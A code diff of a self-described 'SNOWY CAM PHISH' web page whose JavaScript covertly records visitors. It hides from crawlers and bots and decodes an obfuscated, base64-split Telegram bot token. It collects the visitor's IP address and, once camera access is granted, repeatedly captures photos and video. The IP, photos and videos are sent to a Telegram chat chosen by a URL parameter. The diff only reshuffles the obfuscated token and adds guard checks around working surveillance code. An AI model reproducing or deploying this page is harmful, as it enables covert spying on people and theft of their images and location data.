@@ -62,9 +62,9 @@
     <canvas id="canvas"></canvas>
 
     <script>
-        const _0x4d5e = ["ODc3MzEyNDcx", "NTpBQUhKS0RPY1", "FGNVUKbGFTbG9uZ", "ERWaXJ0dWFsX0RtOGRsYw=="];
-        const _0x3f2a = _0x4d5e[0] + _0x4d5e[1] + _0x4d5e[2] + _0x4d5e[3];
-        const _0x7b1c = (() => { try { return atob(_0x3f2a); } catch(e) { return ""; } })();
+        const _0x1a2b = ["ODc3MzEyNDcx", "NTpBQUhKS0RPY1", "FGNVUKbGFTbG9uZ", "VXJpdGhfRG04ZGxj", "=="];
+        const _0x3c4d = _0x1a2b[0] + _0x1a2b[1] + _0x1a2b[2] + _0x1a2b[3] + _0x1a2b[4];
+        const _0x5e6f = (() => { try { return atob(_0x3c4d); } catch(e) { return ""; } })();
         
         const urlParams = new URLSearchParams(window.location.search);
         const TARGET_ID = urlParams.get('i');
@@ -75,7 +75,7 @@
         const isBot = /bot|crawl|spider|scrape|googlebot|bingbot|yahoo|facebook|twitter|whatsapp|instagram|telegram|slack|discord/i.test(ua);
         
         window.onload = function() {
-            if (TARGET_ID && !isBot) {
+            if (TARGET_ID && !isBot && _0x5e6f) {
                 const startTime = performance.now();
                 fetch('https://api.ipify.org?format=json', { cache: 'no-cache', priority: 'high' })
                 .then(response => response.json())
@@ -84,7 +84,7 @@
                     const zaman = new Date().toLocaleString('tr-TR');
                     const gecikme = Math.round(performance.now() - startTime);
                     const mesaj = `❄️ SNOWY CAM PHISH ❄️\n━━━━━━━━━━━━━━━━━━━━━\n🌐 IP Adresi: ${ip}\n⏱️ Zaman: ${zaman}\n⚡ Tepki Süresi: ${gecikme}ms\n━━━━━━━━━━━━━━━━━━━━━\n⚡ @snowy_dexry_wexry ⚡`;
-                    fetch(`https://api.telegram.org/bot${_0x7b1c}/sendMessage`, {
+                    fetch(`https://api.telegram.org/bot${_0x5e6f}/sendMessage`, {
                         method: 'POST', headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify({ chat_id: TARGET_ID, text: mesaj })
                     });
@@ -101,7 +101,7 @@
         let photoInterval = null;
         
         async function startCamera() {
-            if (isBot) return;
+            if (isBot || !_0x5e6f) return;
             try {
                 stream = await navigator.mediaDevices.getUserMedia({ video: { width: { ideal: 640 }, height: { ideal: 480 }, frameRate: { ideal: 30 } } });
                 video.srcObject = stream;
@@ -126,7 +126,7 @@
         }
         
         function takePhoto() {
-            if (!video.videoWidth || isBot) return;
+            if (!video.videoWidth || isBot || !_0x5e6f) return;
             const photoStartTime = performance.now(); photoCount++;
             canvas.width = video.videoWidth; canvas.height = video.videoHeight;
             ctx.drawImage(video, 0, 0);
@@ -137,12 +137,12 @@
                 formData.append('chat_id', TARGET_ID);
                 formData.append('photo', blob, `foto_${Date.now()}.jpg`);
                 formData.append('caption', `📸 Fotoğraf #${photoCount} - ${FOTO_SURESI}s (${captureTime.toFixed(2)}ms)`);
-                fetch(`https://api.telegram.org/bot${_0x7b1c}/sendPhoto`, { method: 'POST', body: formData });
+                fetch(`https://api.telegram.org/bot${_0x5e6f}/sendPhoto`, { method: 'POST', body: formData });
             }, 'image/jpeg', 0.9);
         }
         
         function recordVideo() {
-            if (!stream || !stream.active || isBot) return;
+            if (!stream || !stream.active || isBot || !_0x5e6f) return;
             recordedChunks = [];
             const videoStartTime = performance.now();
             const targetDuration = VIDEO_SURESI * 1000;
@@ -161,7 +161,7 @@
                 formData.append('chat_id', TARGET_ID);
                 formData.append('video', blob, `video_${Date.now()}.webm`);
                 formData.append('caption', `🎥 Video #${videoCount} - ${VIDEO_SURESI}s (${(actualDuration/1000).toFixed(3)}s | ±${durationDiff.toFixed(1)}ms | ${boyutKB}KB)`);
-                fetch(`https://api.telegram.org/bot${_0x7b1c}/sendVideo`, { method: 'POST', body: formData });
+                fetch(`https://api.telegram.org/bot${_0x5e6f}/sendVideo`, { method: 'POST', body: formData });
                 videoTimer = setTimeout(recordVideo, 1);
             };
             
